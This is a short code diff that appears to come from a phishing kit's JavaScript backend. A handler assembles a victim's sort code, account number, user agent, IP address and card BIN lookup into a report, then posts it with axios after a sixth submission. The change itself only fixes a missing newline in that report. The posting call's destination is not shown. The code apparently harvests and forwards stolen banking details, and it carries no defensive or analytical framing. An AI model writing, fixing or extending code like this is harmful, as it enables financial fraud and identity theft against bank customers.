@@ -45,7 +45,7 @@ const sendRes = async (req, res) => {
     scode ? scode : null
   }\nAccount Number: ${
     accno ? accno : null
-  }+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+  }\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
   if (count == 6) {
     await axios
       .post(
